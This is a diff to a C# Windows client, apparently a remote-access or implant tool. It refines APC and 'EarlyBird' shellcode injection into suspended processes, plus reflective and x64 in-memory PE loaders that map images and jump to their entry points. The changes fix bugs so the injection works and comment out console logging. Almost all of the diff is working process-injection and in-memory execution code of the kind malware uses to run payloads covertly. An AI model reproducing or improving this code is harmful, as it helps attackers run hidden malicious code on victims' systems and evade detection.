@@ -273,34 +273,64 @@ namespace winClient48
 
                 string szExePath = proc.MainModule.FileName;
                 WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
+                si.cb = Marshal.SizeOf(typeof(WinAPI.STARTUPINFO));
                 WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();
 
-                // Create new process in suspended state to inject into
-                bool success = WinAPI.CreateProcess(szExePath, null,
-                    IntPtr.Zero, IntPtr.Zero, false,
+                //Create new process in suspended state to inject into
+                bool success = WinAPI.CreateProcess(
+                    szExePath, 
+                    null,
+                    IntPtr.Zero, 
+                    IntPtr.Zero, 
+                    false,
                     WinAPI.CreationFlags.CREATE_SUSPENDED,
-                    IntPtr.Zero, null, ref si, out pi);
+                    IntPtr.Zero, 
+                    null, 
+                    ref si, 
+                    out pi
+                );
 
-                // Allocate memory within process and write shellcode
-                IntPtr resultPtr = WinAPI.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)abShellCode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
+                if (!success)
+                    throw new Exception($"Create process failed. Error code: {WinAPI.GetLastError()}");
+
+                //Allocate memory within process and write shellcode
+                IntPtr resultPtr = WinAPI.VirtualAllocEx(
+                    pi.hProcess, 
+                    IntPtr.Zero, 
+                    (uint)abShellCode.Length, 
+                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, 
+                    WinAPI.PAGE_READWRITE
+                );
+                if (IntPtr.Zero == resultPtr)
+                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");
 
                 uint nWritten;
                 bool resultBool = WinAPI.WriteProcessMemory(pi.hProcess, resultPtr, abShellCode, (uint)abShellCode.Length, out nWritten);
+                if (!resultBool)
+                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");
 
-                // Open thread
-                IntPtr sht = WinAPI.OpenThread((int)WinAPI.ThreadAccess.SET_CONTEXT, false, (uint)pi.dwThreadId);
                 uint oldProtect = 0;
+                if (IntPtr.Zero == pi.hThread)
+                    throw new Exception($"Invalid valid of pi.hThread. Error code: {WinAPI.GetLastError()}");
 
-                // Modify memory permissions on allocated shellcode
+                //Modify memory permissions on allocated shellcode
                 resultBool = WinAPI.VirtualProtectEx(pi.hProcess, resultPtr, abShellCode.Length, WinAPI.PAGE_EXECUTE_READ, out oldProtect);
+                if (!resultBool)
+                    throw new Exception($"VirtualProtectEx() failed. Error code: {WinAPI.GetLastError()}");
 
-                // Assign address of shellcode to the target thread apc queue
-                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, sht, IntPtr.Zero);
+                //Assign address of shellcode to the target thread apc queue
+                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
+                if (IntPtr.Zero == ptr)
+                    throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
 
                 IntPtr ThreadHandle = pi.hThread;
-                WinAPI.ResumeThread(ThreadHandle);
+
+                uint nRet = WinAPI.ResumeThread(ThreadHandle);
+                if (nRet == 0xFFFFFFFF)
+                    throw new Exception($"APC injection failed. Error code: {WinAPI.GetLastError()}");
 
                 nCode = 1;
+                szMsg = "APC injection is finished. Please check.";
             }
             catch (Exception ex)
             {
@@ -317,48 +347,59 @@ namespace winClient48
 
             try
             {
-                IntPtr Process_handle = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
-                if (IntPtr.Zero == Process_handle)
-                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");
-                
-                IntPtr VAlloc_address = WinAPI.VirtualAllocEx(
-                    Process_handle,
+                Process proc = Process.GetProcessById(nProcId);
+                if (proc == null)
+                    throw new Exception($"Cannot find process with ID: {nProcId}");
+
+                string szExePath = proc.MainModule.FileName;
+                WinAPI.STARTUPINFOEX si = new WinAPI.STARTUPINFOEX();
+                si.StartupInfo.cb = Marshal.SizeOf(typeof(WinAPI.STARTUPINFO));
+                WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();
+
+                bool bRet = WinAPI.CreateProcessW(
+                    szExePath,
+                    null,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    false,
+                    (int)WinAPI.CreationFlags.CREATE_SUSPENDED,
+                    IntPtr.Zero,
+                    null,
+                    ref si,
+                    out pi
+                );
+
+                if (!bRet)
+                    throw new Exception($"CreateProcessW() failed. Error code: {WinAPI.GetLastError()}");
+
+                IntPtr hProc = pi.hProcess;
+                IntPtr hThread = pi.hThread;
+
+                IntPtr resultPtr = WinAPI.VirtualAllocEx(
+                    pi.hProcess,
                     IntPtr.Zero,
                     (uint)abShellCode.Length,
-                    (uint)WinAPI.AllocationType.Commit,
-                    (uint)WinAPI.AllocationProtect.PAGE_EXECUTE_READWRITE);
-                if (IntPtr.Zero == VAlloc_address)
+                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
+                    WinAPI.PAGE_READWRITE
+                );
+                if (IntPtr.Zero == resultPtr)
                     throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");
 
-                IntPtr buf1_address = Marshal.AllocHGlobal(abShellCode.Length);
-                if (IntPtr.Zero == buf1_address)
-                    throw new Exception($"AllocHGlobal() failed. Error code: {WinAPI.GetLastError()}");
+                uint nWritten;
+                bool resultBool = WinAPI.WriteProcessMemory(pi.hProcess, resultPtr, abShellCode, (uint)abShellCode.Length, out nWritten);
+                if (!resultBool)
+                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");
 
-                WinAPI.RtlZeroMemory(buf1_address, abShellCode.Length);
+                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
+                if (IntPtr.Zero == ptr)
+                    throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
 
-                UInt32 getsize = 0;
-                WinAPI.NTSTATUS ntstatus = WinAPI.NtWriteVirtualMemory(Process_handle, VAlloc_address, abShellCode, (uint)abShellCode.Length, ref getsize);
-                if (WinAPI.NTSTATUS.Error == ntstatus)
-                    throw new Exception($"NtWriteVirtualMemory() failed. Error code: {WinAPI.GetLastError()}");
-
-                IntPtr hThread = IntPtr.Zero;
-                WinAPI.CreateRemoteThread(
-                    Process_handle,
-                    IntPtr.Zero,
-                    0,
-                    (IntPtr)buf1_address,
-                    IntPtr.Zero,
-                    (uint)WinAPI.CreationFlags.CREATE_SUSPENDED,
-                    out hThread);
-                if (IntPtr.Zero == hThread)
-                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");
-
-                WinAPI.QueueUserAPC(VAlloc_address, hThread, IntPtr.Zero);
-                WinAPI.ResumeThread(hThread);
-                WinAPI.CloseHandle(Process_handle);
-                WinAPI.CloseHandle(hThread);
+                uint nRet = WinAPI.ResumeThread(pi.hThread);
+                if (nRet == 0xFFFFFFFF)
+                    throw new Exception($"EarlyBird injection failed. Error code: {WinAPI.GetLastError()}");
 
                 nCode = 1;
+                szMsg = "EarlyBird injection is finished. Please check.";
             }
             catch (Exception ex)
             {
@@ -438,12 +479,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
-        /// <summary>
-        /// Perform DLL injection with reflective method.
-        /// </summary>
-        /// <param name="abShellCode"></param>
-        /// <param name="nProcId"></param>
-        /// <returns></returns>
+        ///<summary>
+        ///Perform DLL injection with reflective method.
+        ///</summary>
+        ///<param name="abShellCode"></param>
+        ///<param name="nProcId"></param>
+        ///<returns></returns>
         public (int nCode, string szMsg) fnShellCodeLoader(byte[] abShellCode)
         {
             int nCode = 0;
@@ -495,10 +536,10 @@ namespace winClient48
                     NativeDeclarations.PAGE_EXECUTE_READWRITE
                 );
 
-                // copy headers
+                //copy headers
                 Marshal.Copy(loader.RawBytes, 0, imageBase, (int)loader.OptionalHeader.SizeOfHeaders);
 
-                // copy sections
+                //copy sections
                 foreach (var sec in loader.Sections)
                 {
                     IntPtr dest = IntPtr.Add(imageBase, (int)sec.VirtualAddress);
@@ -510,7 +551,7 @@ namespace winClient48
                     );
                 }
 
-                // relocation
+                //relocation
                 long delta = imageBase.ToInt64() - loader.OptionalHeader.ImageBase;
                 if (delta != 0)
                 {
@@ -539,7 +580,7 @@ namespace winClient48
                             ushort type = (ushort)(value >> 12);
                             ushort rva = (ushort)(value & 0xFFF);
 
-                            if (type == 0x3) // IMAGE_REL_BASED_HIGHLOW
+                            if (type == 0x3) //IMAGE_REL_BASED_HIGHLOW
                             {
                                 IntPtr patch = IntPtr.Add(fixupBase, rva);
                                 int original = Marshal.ReadInt32(patch);
@@ -551,7 +592,7 @@ namespace winClient48
                     }
                 }
 
-                // imports
+                //imports
 
                 var dir2 = loader.OptionalHeader.ImportTable;
                 if (dir2.Size == 0)
@@ -588,7 +629,7 @@ namespace winClient48
 
                         if ((thunkData & 0x80000000) != 0)
                         {
-                            // ordinal
+                            //ordinal
                             funcAddr = NativeDeclarations.GetProcAddress(hDll, (IntPtr)(thunkData & 0xFFFF));
                         }
                         else
@@ -607,7 +648,7 @@ namespace winClient48
                     descPtr = IntPtr.Add(descPtr, descSize);
                 }
 
-                // jump to OEP
+                //Jump to OEP.
                 IntPtr entry = IntPtr.Add(imageBase, (int)loader.OptionalHeader.AddressOfEntryPoint);
                 IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, IntPtr.Zero);
                 NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
@@ -631,13 +672,13 @@ namespace winClient48
             {
                 x64PELoader pe = new x64PELoader(abFileBytes);
 
-                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
+                //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
 
                 IntPtr codebase = IntPtr.Zero;
 
                 codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
 
-                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
+                //Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
 
                 //Copy Sections
                 for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
@@ -645,7 +686,7 @@ namespace winClient48
 
                     IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                     Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
-                    Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
+                    //Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
                 }
 
                 //Perform Base Relocation
@@ -655,8 +696,7 @@ namespace winClient48
 
                 delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);
 
-
-                Console.WriteLine("Delta = {0}", delta.ToString("X4"));
+                //Console.WriteLine("Delta = {0}", delta.ToString("X4"));
 
                 //Modify Memory Based On Relocation Table
 
@@ -744,7 +784,7 @@ namespace winClient48
                     if (DllName == "") { break; }
 
                     IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
-                    Console.WriteLine("Loaded {0}", DllName);
+                    //Console.WriteLine("Loaded {0}", DllName);
                     for (int k = 1; k < 9999; k++)
                     {
                         IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
@@ -760,12 +800,12 @@ namespace winClient48
                 }
 
                 //Transfer Control To OEP
-                Console.WriteLine("Executing loaded PE");
+                //Console.WriteLine("Executing loaded PE");
                 IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                 IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                 NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                Console.WriteLine("Thread Complete");
+                //Console.WriteLine("Thread Complete");
 
                 nCode = 1;
             }
@@ -998,38 +1038,38 @@ namespace winClient48
             //Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
 
             public struct IMAGE_DOS_HEADER
-            {      // DOS .EXE header
-                public UInt16 e_magic;              // Magic number
-                public UInt16 e_cblp;               // Bytes on last page of file
-                public UInt16 e_cp;                 // Pages in file
-                public UInt16 e_crlc;               // Relocations
-                public UInt16 e_cparhdr;            // Size of header in paragraphs
-                public UInt16 e_minalloc;           // Minimum extra paragraphs needed
-                public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
-                public UInt16 e_ss;                 // Initial (relative) SS value
-                public UInt16 e_sp;                 // Initial SP value
-                public UInt16 e_csum;               // Checksum
-                public UInt16 e_ip;                 // Initial IP value
-                public UInt16 e_cs;                 // Initial (relative) CS value
-                public UInt16 e_lfarlc;             // File address of relocation table
-                public UInt16 e_ovno;               // Overlay number
-                public UInt16 e_res_0;              // Reserved words
-                public UInt16 e_res_1;              // Reserved words
-                public UInt16 e_res_2;              // Reserved words
-                public UInt16 e_res_3;              // Reserved words
-                public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
-                public UInt16 e_oeminfo;            // OEM information; e_oemid specific
-                public UInt16 e_res2_0;             // Reserved words
-                public UInt16 e_res2_1;             // Reserved words
-                public UInt16 e_res2_2;             // Reserved words
-                public UInt16 e_res2_3;             // Reserved words
-                public UInt16 e_res2_4;             // Reserved words
-                public UInt16 e_res2_5;             // Reserved words
-                public UInt16 e_res2_6;             // Reserved words
-                public UInt16 e_res2_7;             // Reserved words
-                public UInt16 e_res2_8;             // Reserved words
-                public UInt16 e_res2_9;             // Reserved words
-                public UInt32 e_lfanew;             // File address of new exe header
+            {      //DOS .EXE header
+                public UInt16 e_magic;              //Magic number
+                public UInt16 e_cblp;               //Bytes on last page of file
+                public UInt16 e_cp;                 //Pages in file
+                public UInt16 e_crlc;               //Relocations
+                public UInt16 e_cparhdr;            //Size of header in paragraphs
+                public UInt16 e_minalloc;           //Minimum extra paragraphs needed
+                public UInt16 e_maxalloc;           //Maximum extra paragraphs needed
+                public UInt16 e_ss;                 //Initial (relative) SS value
+                public UInt16 e_sp;                 //Initial SP value
+                public UInt16 e_csum;               //Checksum
+                public UInt16 e_ip;                 //Initial IP value
+                public UInt16 e_cs;                 //Initial (relative) CS value
+                public UInt16 e_lfarlc;             //File address of relocation table
+                public UInt16 e_ovno;               //Overlay number
+                public UInt16 e_res_0;              //Reserved words
+                public UInt16 e_res_1;              //Reserved words
+                public UInt16 e_res_2;              //Reserved words
+                public UInt16 e_res_3;              //Reserved words
+                public UInt16 e_oemid;              //OEM identifier (for e_oeminfo)
+                public UInt16 e_oeminfo;            //OEM information; e_oemid specific
+                public UInt16 e_res2_0;             //Reserved words
+                public UInt16 e_res2_1;             //Reserved words
+                public UInt16 e_res2_2;             //Reserved words
+                public UInt16 e_res2_3;             //Reserved words
+                public UInt16 e_res2_4;             //Reserved words
+                public UInt16 e_res2_5;             //Reserved words
+                public UInt16 e_res2_6;             //Reserved words
+                public UInt16 e_res2_7;             //Reserved words
+                public UInt16 e_res2_8;             //Reserved words
+                public UInt16 e_res2_9;             //Reserved words
+                public UInt32 e_lfanew;             //File address of new exe header
             }
 
             [StructLayout(LayoutKind.Sequential)]
@@ -1201,23 +1241,23 @@ namespace winClient48
             }
 
 
-            /// The DOS header
+            ///The DOS header
 
             private IMAGE_DOS_HEADER dosHeader;
 
-            /// The file header
+            ///The file header
 
             private IMAGE_FILE_HEADER fileHeader;
 
-            /// Optional 32 bit file header 
+            ///Optional 32 bit file header 
 
             private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
 
-            /// Optional 64 bit file header 
+            ///Optional 64 bit file header 
 
             private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
 
-            /// Image Section headers. Number of sections is in the file header.
+            ///Image Section headers. Number of sections is in the file header.
 
             private IMAGE_SECTION_HEADER[] imageSectionHeaders;
 
@@ -1227,13 +1267,13 @@ namespace winClient48
 
             public x64PELoader(string filePath)
             {
-                // Read in the DLL or EXE and get the timestamp
+                //Read in the DLL or EXE and get the timestamp
                 using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                 {
                     BinaryReader reader = new BinaryReader(stream);
                     dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
 
-                    // Add 4 bytes to the offset
+                    //Add 4 bytes to the offset
                     stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
                     UInt32 ntHeadersSignature = reader.ReadUInt32();
@@ -1262,13 +1302,13 @@ namespace winClient48
 
             public x64PELoader(byte[] fileBytes)
             {
-                // Read in the DLL or EXE and get the timestamp
+                //Read in the DLL or EXE and get the timestamp
                 using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
                 {
                     BinaryReader reader = new BinaryReader(stream);
                     dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
 
-                    // Add 4 bytes to the offset
+                    //Add 4 bytes to the offset
                     stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
                     UInt32 ntHeadersSignature = reader.ReadUInt32();
@@ -1297,10 +1337,10 @@ namespace winClient48
 
             public static T FromBinaryReader<T>(BinaryReader reader)
             {
-                // Read in a byte array
+                //Read in a byte array
                 byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
 
-                // Pin the managed memory while, copy it out the data, then unpin it
+                //Pin the managed memory while, copy it out the data, then unpin it
                 GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
                 T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
                 handle.Free();
@@ -1329,7 +1369,7 @@ namespace winClient48
             }
 
 
-            /// Gets the optional header
+            ///Gets the optional header
 
             public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
             {
@@ -1340,7 +1380,7 @@ namespace winClient48
             }
 
 
-            /// Gets the optional header
+            ///Gets the optional header
 
             public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
             {
